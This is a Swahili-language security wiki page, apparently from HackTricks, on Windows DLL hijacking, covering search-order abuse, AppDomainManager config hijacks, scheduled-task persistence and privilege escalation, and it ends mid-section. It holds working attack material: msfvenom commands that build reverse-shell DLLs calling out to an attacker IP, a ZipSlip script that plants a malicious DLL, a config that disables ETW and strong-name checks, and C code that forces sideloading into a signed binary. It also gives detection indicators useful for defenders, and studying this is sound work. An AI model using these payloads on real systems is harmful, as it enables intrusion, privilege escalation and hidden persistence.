# Utekaji wa DLL

{{#include ../../../banners/hacktricks-training.md}}


## Taarifa za Msingi

DLL Hijacking huhusisha kudanganya programu inayoaminika ili ipakie DLL hasidi. Neno hili linajumuisha mbinu kadhaa kama vile **DLL Spoofing, Injection, na Side-Loading**. Hutumika hasa kutekeleza msimbo na kupata persistence, na mara chache zaidi, kufanya privilege escalation. Ingawa hapa tunalenga escalation, mbinu ya utekaji hubaki ileile bila kujali lengo.

### Mbinu za Kawaida

Kuna mbinu kadhaa za DLL hijacking, na ufanisi wa kila moja hutegemea mkakati wa programu wa kupakia DLL:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Kubadilisha DLL halisi na DLL hasidi; kwa hiari, kutumia DLL Proxying ili kuhifadhi utendakazi wa DLL asili.
2. **DLL Search Order Hijacking**: Kuweka DLL hasidi kwenye njia ya utafutaji iliyo mbele ya ile halali, kwa kutumia mpangilio wa utafutaji wa programu.
3. **Phantom DLL Hijacking**: Kuunda DLL hasidi ambayo programu itapakia ikidhani ni DLL inayohitajika lakini haipo.
4. **DLL Redirection**: Kubadilisha vigezo vya utafutaji kama `%PATH%` au faili za `.exe.manifest` / `.exe.local` ili kuelekeza programu kwenye DLL hasidi.
5. **WinSxS DLL Replacement**: Kubadilisha DLL halali na nakala hasidi katika saraka ya WinSxS; mbinu hii mara nyingi huhusishwa na DLL side-loading.
6. **Relative Path DLL Hijacking**: Kuweka DLL hasidi katika saraka inayodhibitiwa na mtumiaji pamoja na programu iliyonakiliwa, sawa na mbinu za Binary Proxy Execution.

Programu inaweza pia kutumia **kipakiaji chake cha DLL**. Mchakato wenye upendeleo unaweza kuorodhesha saraka ndogo kama `Libraries` au `Plugins` na kupitisha DLL iliyochaguliwa kwa helper, bila kutegemea mpangilio wa kawaida wa utafutaji wa DLL wa Windows. Ikiwa akaunti nyingine inaweza kuunda faili katika saraka hiyo mahususi, ichukulie kama kiashiria cha kuendelea na ukaguzi: thibitisha utambulisho wa mchakato, ACL inayotumika kwa saraka, kanuni ya kuchagua faili, na kama kuna njia inayofikiwa ya kupakia DLL. Saraka inayoweza kuandikwa iliyo karibu na executable haithibitishi kwamba mchakato hupakia DLL kutoka humo.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### Utekaji wa AppDomainManager (`<exe>.config` + assembly ya mshambulizi)

Classic DLL sideloading si njia pekee ya kufanya mchakato unaoaminika wa **.NET Framework** upakie msimbo wa mshambulizi. Ikiwa executable lengwa ni programu ya **managed**, CLR pia hukagua **faili ya usanidi wa programu** yenye jina la executable (kwa mfano `Setup.exe.config`). Faili hiyo inaweza kufafanua **AppDomainManager** maalum. Ikiwa config inaelekeza kwenye assembly inayodhibitiwa na mshambulizi iliyowekwa karibu na EXE, CLR huipakia **kabla ya njia ya kawaida ya msimbo wa programu** na kuiendesha ndani ya mchakato unaoaminika.<sup>[[24]](#references)</sup>

Kulingana na schema ya usanidi ya .NET Framework ya Microsoft, `<appDomainManagerAssembly>` na `<appDomainManagerType>` lazima ziwepo ili manager maalum itumike.<sup>[[16]](#references)[[17]](#references)</sup>

Config ndogo:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Meneja wa kiwango cha chini:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Vidokezo vya vitendo:
- Hii ni mbinu mahususi ya **.NET Framework**. Inategemea uchanganuzi wa usanidi wa CLR, si mpangilio wa utafutaji wa Win32 DLL.
- Programu mwenyeji lazima iwe **managed EXE**. Ukaguzi wa haraka: `sigcheck -m target.exe`, `corflags target.exe`, au angalia **CLR Runtime Header** kwenye metadata ya PE.
- Jina la faili la usanidi lazima lilingane kabisa na jina la executable (`<binary>.config`), na kwa kawaida huwa **karibu na EXE**.
- Hii ni muhimu unapotumia **binaries za Microsoft/muuzaji zilizosainiwa**, kwa sababu EXE inayoaminika hubaki bila kuguswa huku assembly hasidi ya managed ikiendeshwa ndani ya mchakato.
- Ikiwa tayari una saraka ya kisakinishi/sasisho inayoweza kuandikika, utekaji wa AppDomainManager unaweza kutumika kama **hatua ya kwanza**, ukifuatiwa na DLL sideloading ya kawaida au upakiaji wa reflective kwa hatua zinazofuata.

### AppDomainManager kama downloader + bootstrap ya scheduled task

Mfumo wa vitendo wa kuingilia ni kuunganisha EXE ya managed inayoaminika na faili hasidi ya `*.config` pamoja na DLL hasidi ya AppDomainManager inayofanya kazi kama **bootstrapper ndogo**:<sup>[[25]](#references)</sup>

1. Mtumiaji huendesha kisakinishi au programu ya kusasisha ya .NET iliyosainiwa kutoka eneo linaloaminika, kama `%USERPROFILE%\Downloads`.
2. Config iliyo karibu husababisha CLR kupakia assembly ya mshambuliaji **kabla** ya mantiki halali ya programu kuanza.
3. Manager hasidi hufanya **ukaguzi wa njia** (kwa mfano, kuendelea tu ikiwa EXE mwenyeji inaendeshwa kutoka `Downloads`, na kuruhusu hatua ya pili kuendeshwa kutoka `%LOCALAPPDATA%` pekee).
4. Ukaguzi ukifaulu, hupakua payload halisi hadi kwenye njia inayoweza kuandikwa na mtumiaji, kama `%LOCALAPPDATA%\PerfWatson2.exe`, na kusakinisha persistence kwa kutumia scheduled task.

Kwa nini lahaja hii ni muhimu:
- EXE ya mwenyeji iliyosainiwa hubaki bila kubadilishwa, kwa hiyo ukaguzi unaohesabu hash ya binary kuu pekee huenda usigundue uvamizi.
- **Uchambuzi wa kupinga unaotegemea njia** ni wa kawaida: kuhamisha jozi ya ZIP/EXE/DLL hadi Desktop, Temp, au njia ya sandbox kunaweza kuvunja mnyororo kimakusudi.
- DLL ya AppDomainManager ya hatua ya kwanza inaweza kubaki ndogo na isiyoonekana sana huku implant halisi ikipakuliwa baadaye.

Mfano mdogo wa persistence unaoonekana mara nyingi katika mfumo huu:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Maelezo:
- ` /rl highest` humaanisha **kiwango cha juu zaidi kinachopatikana** kwa mtumiaji/kikao hicho; hakihakikishi yenyewe kupandishwa hadi SYSTEM.
- Mbinu hii mara nyingi huainishwa vyema kama **utekelezaji/udumishaji kupitia matumizi mabaya ya .NET config** badala ya utekaji wa kawaida wa mpangilio wa utafutaji wa DLL iliyokosekana, ingawa operators mara nyingi huziunganisha mbinu hizi mbili.

Viashiria vya utambuzi:
- Executables za .NET zilizosainiwa zinazoendeshwa kutoka kwenye **njia za kutoa ZIP**, `Downloads`, `%TEMP%`, au folda nyingine zinazoweza kuandikwa na mtumiaji, zikiwa na faili ya `<exe>.config` **iliyowekwa pamoja nazo**.
- Scheduled tasks mpya ambazo kitendo chake kinaelekeza kwenye `%LOCALAPPDATA%`, `%APPDATA%`, au `Downloads`, na majina yake yanafanana na yale ya visasisho vya browser/vendor.
- Michakato ya bootstrap ya managed iliyo hai kwa muda mfupi, inayopakua EXE nyingine mara moja, kisha kuwasha `schtasks.exe`.
- Samples zinazoacha kufanya kazi mapema isipokuwa njia ya executable ilingane na folda ya wasifu wa mtumiaji inayotarajiwa.

### Kuteka scheduled task iliyopo ili kuanzisha upya sideload chain

Kwa ajili ya persistence, usitafute tu **kuunda task mpya**. Baadhi ya makundi ya wavamizi husubiri hadi installer halali iunde **task ya kawaida ya kusasisha**, kisha **huandika upya kitendo cha task** ili jina, mwandishi na kichochezi kilichopo viendelee kuonekana vya kawaida kwa watetezi.

Workflow inayoweza kutumiwa tena:
1. Sakinisha/endesha software halali na utambue task ambayo kwa kawaida huunda.
2. Hamisha task XML na uandike thamani za sasa za `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Badilisha kitendo pekee ili task iwashe **trusted host EXE** yako kutoka kwenye folda ya staging inayoweza kuandikwa na mtumiaji; kisha EXE hiyo side-load au AppDomain-load payload halisi.
4. Sajili upya jina lilelile la task badala ya kuunda artifact mpya ya persistence iliyo wazi.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Kwa nini ni vigumu zaidi kutambua:
- Jina la task bado linaweza kuonekana halali (kwa mfano, la updater ya vendor).
- **Task Scheduler service** huiwasha, kwa hivyo uthibitishaji wa parent/ancestor mara nyingi huona mnyororo wa scheduling unaotarajiwa badala ya `explorer.exe`.
- Timu za DFIR zinazotafuta tu **majina mapya ya task** zinaweza kukosa task ambayo usajili wake tayari ulikuwepo lakini action yake sasa inaelekeza kwenye `%LOCALAPPDATA%`, `%APPDATA%`, au njia nyingine inayodhibitiwa na mshambuliaji.

Njia za haraka za uchunguzi:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Linganisha XML za `C:\Windows\System32\Tasks\*` na metadata ya `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` na baseline.
- Toa alert wakati **task ya updater inayoonekana ya vendor** inapotekelezwa kutoka **directories zinazoweza kuandikiwa na mtumiaji** au inapowasha .NET EXE yenye faili ya `*.config` iliyo pamoja nayo.

> [!TIP]
> Kwa mnyororo wa hatua kwa hatua unaoweka HTML staging, configs za AES-CTR na .NET implants juu ya DLL sideloading, kagua workflow iliyo hapa chini.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Kupata DLL zinazokosekana

Njia ya kawaida zaidi ya kupata Dll zinazokosekana ndani ya mfumo ni kuendesha [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) kutoka sysinternals, **ukiweka** **filters 2 zifuatazo**:

![Mbinu za Kawaida - Kupata Dll zinazokosekana: Njia ya kawaida zaidi ya kupata Dll zinazokosekana ndani ya mfumo ni kuendesha procmon kutoka sysinternals, ukiweka filters 2 zifuatazo](<../../../images/image (961).png>)

![Mbinu za Kawaida - Kupata Dll zinazokosekana: Njia ya kawaida zaidi ya kupata Dll zinazokosekana ndani ya mfumo ni kuendesha procmon kutoka sysinternals, ukiweka filters 2 zifuatazo](<../../../images/image (230).png>)

na kuonyesha tu **File System Activity**:

![Mbinu za Kawaida - Kupata Dll zinazokosekana: na kuonyesha tu File System Activity](<../../../images/image (153).png>)

Ikiwa unatafuta **dll zinazokosekana kwa ujumla**, **acha** hii ikiendelea kwa **sekunde** chache.\
Ikiwa unatafuta **DLL inayokosekana ndani ya executable maalum**, weka filter nyingine kama **"Process Name" "contains" `<exec name>`**, iendeshe, kisha usitishe kunasa matukio.<sup>[[9]](#references)</sup>

## Kutumia vibaya DLL zinazokosekana

Ili kuongeza privileges, tafuta **DLL ambayo process yenye privileges inajaribu kupakia** kutoka eneo unaloweza kuandikia. Hili linaweza kutokea unapodhibiti directory inayotafutwa kabla ya directory iliyo na DLL halali, au wakati DLL iliyoombwa haipo na unaweza kuandika kwenye mojawapo ya directories zinazotafutwa.

### Mpangilio wa Utafutaji wa DLL

**Ndani ya** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **unaweza kuona jinsi Dll zinavyopakiwa hasa.**

**Windows applications** hutafuta DLL kwa kufuata seti ya **njia za utafutaji zilizobainishwa awali**, kwa mfuatano maalum. Tatizo la DLL hijacking hutokea pale DLL hasidi inapowekwa kimkakati katika mojawapo ya directories hizi, ili ipakiwe kabla ya DLL halisi. Suluhisho la kuzuia hili ni kuhakikisha application inatumia absolute paths inapotaja DLL zinazohitajika.

Unaweza kuona **mpangilio wa utafutaji wa DLL kwenye** mifumo ya **32-bit** hapa chini:

1. Directory ambayo application ilipakiwa kutoka.
2. System directory. Tumia function ya [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) kupata path ya directory hii.(_C:\Windows\System32_)
3. System directory ya 16-bit. Hakuna function inayopata path ya directory hii, lakini hutafutwa. (_C:\Windows\System_)
4. Windows directory. Tumia function ya [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) kupata path ya directory hii.
   1. (_C:\Windows_)
5. Directory ya sasa.
6. Directories zilizoorodheshwa kwenye environment variable ya PATH. Kumbuka kwamba hii haijumuishi path ya kila application iliyobainishwa na registry key ya **App Paths**. Key ya **App Paths** haitumiki kukokotoa path ya utafutaji wa DLL.

Huu ndio mpangilio wa utafutaji wa **chaguo-msingi** wakati **SafeDllSearchMode** imewezeshwa. Ikiwa imezimwa, directory ya sasa hupanda hadi nafasi ya pili. Ili kuzima kipengele hiki, tengeneza registry value ya **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** na uiweke kuwa 0 (imewezeshwa kwa chaguo-msingi).

Ikiwa function ya [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) itaitwa na **LOAD_WITH_ALTERED_SEARCH_PATH**, utafutaji huanza kwenye directory ya executable module ambayo **LoadLibraryEx** inapakia.

Hatimaye, DLL inaweza kupakiwa kwa absolute path badala ya jina lake. Katika hali hiyo, Windows hutafuta DLL yenyewe kwenye path hiyo pekee; dependencies zilizoombwa kwa majina bado hufuata mpangilio husika wa utafutaji.

Kuna njia nyingine za kubadilisha mpangilio wa utafutaji, lakini sitazieleza hapa.

### Kuunganisha arbitrary file write na missing-DLL hijack

**Mbinu inayohusiana:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Tumia filters za **ProcMon** (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) kukusanya majina ya DLL ambazo process inajaribu kupata lakini haipati.<sup>[[14]](#references)</sup>
2. Ikiwa binary inaendeshwa kwa **ratiba/kama service**, kuweka DLL yenye mojawapo ya majina hayo kwenye **application directory** (kipengee #1 cha mpangilio wa utafutaji) kutaisababisha kupakiwa kwenye utekelezaji unaofuata. Katika hali moja ya .NET scanner, process ilitafuta `hostfxr.dll` kwenye `C:\samples\app\` kabla ya kupakia nakala halisi kutoka `C:\Program Files\dotnet\fxr\...`.
3. Tengeneza payload DLL (kwa mfano, reverse shell) yenye export yoyote: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Ikiwa primitive yako ni **arbitrary write ya mtindo wa ZipSlip**, tengeneza ZIP ambayo entry yake inatoka nje ya extraction dir ili DLL iwekwe kwenye app folder:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Peleka archive kwenye inbox/share inayofuatiliwa; scheduled task itakapozindua upya process, itapakia DLL hasidi na kutekeleza msimbo wako kama service account.

### Kulazimisha sideloading kupitia RTL_USER_PROCESS_PARAMETERS.DllPath

Njia ya kina ya kudhibiti kwa uhakika DLL search path ya process mpya ni kuweka sehemu ya DllPath katika RTL_USER_PROCESS_PARAMETERS wakati wa kuunda process kwa kutumia native APIs za ntdll. Kwa kuweka directory inayodhibitiwa na mshambulizi hapa, process lengwa inayotafuta DLL iliyoingizwa kwa jina (bila absolute path na bila kutumia safe loading flags) inaweza kulazimishwa kupakia DLL hasidi kutoka kwenye directory hiyo.

Wazo kuu
- Unda process parameters kwa RtlCreateProcessParametersEx na utoe DllPath maalum inayoelekeza kwenye folder unalodhibiti (kwa mfano, directory ilipo dropper/unpacker yako).
- Unda process kwa RtlCreateUserProcess. Binary lengwa inapotafuta DLL kwa jina, loader itatumia DllPath hii wakati wa kutafuta, na hivyo kuwezesha sideloading ya kuaminika hata kama DLL hasidi haipo pamoja na target EXE.

Vidokezo/vikwazo
- Hili huathiri child process inayoundwa; ni tofauti na SetDllDirectory, inayoathiri process ya sasa pekee.
- Lengwa lazima li-import au li-load Library DLL kwa jina (bila absolute path na bila kutumia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs na absolute paths zilizowekwa moja kwa moja haziwezi kutekwa nyara. Forwarded exports na SxS zinaweza kubadilisha mpangilio wa kipaumbele.

Mfano mdogo wa C (ntdll, wide strings, ushughulikiaji rahisi wa makosa):

<details>
<summary>Mfano kamili wa C: kulazimisha DLL sideloading kupitia RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Mfano wa matumizi ya kiutendaji
- Weka xmllite.dll hasidi (inayotoa functions zinazohitajika au kuelekeza maombi kwa DLL halisi) kwenye directory yako ya DllPath.
- Zindua binary iliyosainiwa inayojulikana kutafuta xmllite.dll kwa jina kwa kutumia mbinu iliyoelezwa hapo juu. Loader itatatua import kupitia DllPath iliyotolewa na kufanya sideload ya DLL yako.

Mbinu hii imeonekana ikitumika porini kuendesha minyororo ya sideloading ya hatua nyingi: launcher ya awali huweka helper DLL, ambayo kisha huzindua binary inayosainiwa na Microsoft na inayoweza kutekwa, ikiwa na DllPath maalum ili kulazimisha kupakia DLL ya mshambuliaji kutoka kwenye staging directory.<sup>[[6]](#references)</sup>


### Utekaji wa AppDomainManager wa .NET kupitia `.exe.config`

Kwa shabaha za **.NET Framework**, sideloading inaweza kufanywa **kabla ya `Main()`** bila kurekebisha memory kwa kutumia vibaya faili ya **`.exe.config`** iliyo karibu na programu. Badala ya kutegemea tu mpangilio wa utafutaji wa Win32 DLL, mshambuliaji huweka .NET EXE halali karibu na config hasidi na assembly moja au zaidi zinazodhibitiwa na mshambuliaji.

Jinsi mnyororo huu unavyofanya kazi:<sup>[[15]](#references)[[22]](#references)</sup>
1. Host EXE huanza na **CLR husoma `<exe>.config`**.
2. Config huweka **`<appDomainManagerAssembly>`** na **`<appDomainManagerType>`** ili runtime ianzishe `AppDomainManager` inayodhibitiwa na mshambuliaji.
3. Manager hasidi hupata **utekelezaji kabla ya `Main()`** ndani ya mchakato wa host unaoaminika.
4. Config hiyo hiyo inaweza kulazimisha CLR kutatua assembly za ndani kwanza (kwa mfano `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) na kudhoofisha uthibitishaji/telemetry ya runtime bila inline patching.

Muundo wa mtindo wa kampeni (mpangilio kamili wa nesting unaweza kutofautiana kulingana na directive / toleo la CLR):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Kwa nini hili linafaa:
- **`<probing privatePath="."/>`** huweka utatuzi wa assembly kwenye saraka ya programu, na kugeuza folda hiyo kuwa eneo linalotabirika la sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** huhamishia utekelezaji kwenye msimbo wa mshambuliaji wakati wa uanzishaji wa CLR, kabla mantiki halali ya programu haijaanza kufanya kazi.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** inaweza kuruhusu programu yenye full-trust kupakia assemblies zisizosainiwa au zilizobadilishwa bila kushindwa kwa uthibitishaji wa strong-name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** huzuia uelekezaji upya wa publisher-policy kwenda kwenye assemblies mpya zaidi.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** hufanya uteuzi wa runtime uwe thabiti zaidi.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** inavutia hasa kwa sababu **CLR huzima mwonekano wake wa ETW kupitia usanidi**, badala ya implant kufanya patch ya `EtwEventWrite` kwenye kumbukumbu.

Muundo wa kiutendaji ulioonekana katika kampeni za hivi karibuni:
- Hatua ya 1 huweka `setup.exe`, `setup.exe.config`, na assemblies za ndani.
- Hatua ya 2 huzinakili kwenye folda ya **AppData update** inayoaminika, hubadilisha jina la host kuwa kitu kama `update.exe`, kisha huiwasha tena kupitia **scheduled task**.
- Hatua ya 3 huthibitisha muktadha wa utekelezaji (kwa mfano, parent inayotarajiwa ya `svchost.exe` kutoka Task Scheduler) kabla ya kupakia RAT DLL/export ya mwisho.

Mawazo ya kutafuta:
- **.NET executables** zilizosainiwa au halali kwa namna nyingine, zinazoendeshwa pamoja na faili za **`.config`** zinazotiliwa shaka katika maeneo yanayoweza kuandikiwa na mtumiaji.
- Faili za `.config` zilizo na **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`**, au **`etwEnable enabled="false"`**.
- Scheduled tasks zinazoanzisha tena binaries za update zilizobadilishwa majina kutoka **`%LOCALAPPDATA%`** au saraka maalum za programu za `\bin\update\`.
- Minyororo ya parent/child ambapo scheduled task huwasha host ya .NET inayoaminika, ambayo mara moja hupakia assemblies zisizo za mtengenezaji kutoka saraka yake yenyewe.

#### Isipokuwa katika mpangilio wa utafutaji wa DLL, kulingana na nyaraka za Windows

Nyaraka za Windows zinataja baadhi ya hali zinazokiuka mpangilio wa kawaida wa utafutaji wa DLL:

- Mfumo unapokutana na **DLL yenye jina sawa na DLL ambayo tayari imepakiwa kwenye kumbukumbu**, huruka utafutaji wa kawaida. Badala yake, hukagua redirection na manifest kabla ya kutumia DLL ambayo tayari iko kwenye kumbukumbu. **Katika hali hii, mfumo hautafuti DLL**.
- Ikiwa DLL inatambuliwa kama **known DLL** kwa toleo la sasa la Windows, mfumo utatumia toleo lake la known DLL, pamoja na DLL zozote tegemezi, **bila kufanya utafutaji**. Registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** ina orodha ya known DLLs hizi.
- Ikiwa **DLL ina dependencies**, utafutaji wa DLL hizo tegemezi hufanywa kana kwamba zilitajwa kwa kutumia **majina ya module** pekee, bila kujali kama DLL ya awali ilitambuliwa kupitia full path.

### Kupandisha Haki

**Mahitaji**:

- Tambua mchakato unaoendeshwa au utakaoendeshwa chini ya **haki tofauti** (usogezaji mlalo au wa upande), na ambao **unakosa DLL**.
- Hakikisha una **ruhusa ya kuandika** kwenye **saraka** yoyote ambamo **DLL** itatafutwa. Mahali hapa panaweza kuwa saraka ya executable au saraka iliyo ndani ya system path.

Masharti haya si ya kawaida kwa chaguomsingi: executable zenye haki za juu kwa kawaida hazikosi dependencies za DLL, na watumiaji wa kawaida kwa kawaida hawawezi kuandika kwenye saraka za system search-path. Hata hivyo, mazingira yaliyosanidiwa vibaya yanaweza kuonyesha hali zote mbili.\
Ikiwa mahitaji yametimizwa, angalia mradi wa [UACME](https://github.com/hfiref0x/UACME). Ingawa lengo lake kuu ni UAC bypass, una PoCs za DLL hijacking kwa matoleo maalum ya Windows ambazo mara nyingi zinaweza kurekebishwa ili kutumia saraka inayoweza kuandikiwa uliyoipata.

Kumbuka kwamba unaweza **kuangalia ruhusa zako kwenye folda** kwa kufanya hivi:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

Na **kagua ruhusa za folda zote ndani ya PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Unaweza pia kuangalia imports za executable na exports za dll kwa kutumia:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Kwa mwongozo kamili wa jinsi ya ** kutumia vibaya DLL Hijacking ili kuongeza mamlaka** kwa ruhusa za kuandika kwenye **folda ya System Path**, angalia:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Zana za kiotomatiki

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)itaangalia kama una ruhusa za kuandika kwenye folda yoyote iliyo ndani ya system PATH.\
Zana nyingine za kiotomatiki zinazofaa kugundua athari hii ni **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ na _Write-HijackDll._

### Mfano

Ukikuta hali inayoweza kutumiwa vibaya, mojawapo ya mambo muhimu zaidi ya kufanikisha utumiaji wake ni **kuunda dll inayotoa angalau functions zote ambazo executable ita-import kutoka kwayo**. Hata hivyo, kumbuka kuwa DLL Hijacking inaweza kutumika [kuongeza mamlaka kutoka kiwango cha Medium Integrity hadi High **(kwa kukwepa UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) au kutoka[ **High Integrity hadi SYSTEM**](../index.html#from-high-integrity-to-system)**.** Unaweza kupata mfano wa **jinsi ya kuunda dll halali** ndani ya utafiti huu wa DLL hijacking unaolenga utekelezaji wa DLL hijacking: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Zaidi ya hayo, **sehemu inayofuata** ina **misimbo ya msingi ya dll** ambayo inaweza kuwa muhimu kama **violezo** au kwa kuunda **dll yenye functions zisizohitajika zilizotolewa**.

## **Kuunda na ku-compile DLLs**

### **DLL Proxifying**

Kimsingi, **DLL proxy** ni DLL inayoweza **kutekeleza msimbo wako hasidi inapopakiwa**, lakini pia **kufichua** na **kufanya kazi** kama **inavyotarajiwa**, kwa **kuelekeza upya miito yote kwenye library halisi**.

Kwa kutumia zana ya [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) au [**Spartacus**](https://github.com/Accenture/Spartacus), unaweza **kubainisha executable na kuchagua library** unayotaka ku-proxify na **kutengeneza dll iliyoproxifyiwa**, au **kubainisha DLL** na **kutengeneza dll iliyoproxifyiwa**.

### **Meterpreter**

**Pata rev shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Pata meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Unda mtumiaji (x86; sikuona toleo la x64):**

```bash
